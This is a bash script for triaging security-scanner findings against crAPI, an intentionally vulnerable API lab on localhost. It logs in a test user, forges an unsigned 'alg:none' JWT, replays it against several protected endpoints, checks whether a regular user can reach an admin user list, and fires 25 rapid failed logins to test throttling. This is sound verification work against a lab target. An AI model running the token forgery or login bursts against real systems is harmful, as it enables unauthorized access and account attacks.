#!/usr/bin/env bash
# Manual verification helpers for the crAPI findings APIForge reported.
# Goal: for each finding, confirm it's a REAL vuln (true positive) or a
# false positive. Run the commands, look at the RESPONSE BODY, and fill in
# fp_tracker.csv with TP / FP.
#
# Prereq: crAPI up on http://localhost:8888, identity healthy.
set -u
BASE="http://localhost:8888"

echo "=== 0. Get a REAL regular-user token (User A) ==="
TOKEN_A=$(curl -s -X POST "$BASE/identity/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"usera@test.com","password":"Password123!"}' | python3 -c 'import sys,json;print(json.load(sys.stdin).get("token",""))')
echo "User A token (first 30): ${TOKEN_A:0:30}..."

echo
echo "=== 1. Forge an alg:none token from User A's token (the JWT check's attack) ==="
FORGED=$(python3 - "$TOKEN_A" << 'PY'
import sys, base64, json
def b64u(b): return base64.urlsafe_b64encode(b).decode().rstrip("=")
tok = sys.argv[1]
try:
    payload = tok.split(".")[1]
    payload += "=" * (-len(payload) % 4)
    body = json.loads(base64.urlsafe_b64decode(payload))
except Exception:
    body = {"sub": "usera@test.com", "role": "user"}
hdr = {"alg": "none", "typ": "JWT"}
print(f"{b64u(json.dumps(hdr).encode())}.{b64u(json.dumps(body).encode())}.")
PY
)
echo "forged alg:none token: ${FORGED:0:40}..."

echo
echo "############ JWT alg:none — THE KEY TEST ############"
echo "For EACH endpoint: does the forged token return the REAL protected data,"
echo "or a 200 with an error/empty body? Real data = TRUE POSITIVE. Error body = FALSE POSITIVE."
for EP in \
  "/identity/api/v2/user/dashboard" \
  "/identity/api/v2/vehicle/vehicles" \
  "/community/api/v2/community/posts/recent" \
  "/workshop/api/mechanic/service_requests" \
  "/workshop/api/shop/products" \
  "/workshop/api/shop/orders/all" \
  "/workshop/api/management/users/all" ; do
  echo
  echo "---- $EP ----"
  echo "[forged alg:none]"; curl -s -i "$BASE$EP" -H "Authorization: Bearer $FORGED" | head -1
  curl -s "$BASE$EP" -H "Authorization: Bearer $FORGED" | head -c 300; echo
  echo "[NO token, for comparison]"; curl -s -i "$BASE$EP" | head -1
  echo "  -> If forged shows real data but no-token is 401/403, it's a REAL bypass (TP)."
  echo "  -> If forged is 200 but body is an error/empty, it's a FALSE POSITIVE."
done

echo
echo "############ BFLA / Priv-esc — /workshop/api/management/users/all ############"
echo "Does a REGULAR user (real token) get the admin user list back?"
curl -s -i "$BASE/workshop/api/management/users/all" -H "Authorization: Bearer $TOKEN_A" | head -1
curl -s "$BASE/workshop/api/management/users/all" -H "Authorization: Bearer $TOKEN_A" | head -c 400; echo
echo "  -> Real user list = TP. 403/empty/error = FP."

echo
echo "############ Rate limiting — send 25 rapid logins, count 429s ############"
codes=""
for i in $(seq 1 25); do
  c=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$BASE/identity/api/auth/login" \
      -H 'Content-Type: application/json' \
      -d '{"email":"usera@test.com","password":"wrongpass"}')
  codes="$codes $c"
done
echo "status codes: $codes"
echo "  -> Any 429 = the app DOES throttle (your check may be a FP or threshold too low)."
echo "  -> All 200/4xx-non-429 = no throttling (TP). Decide your real threshold."
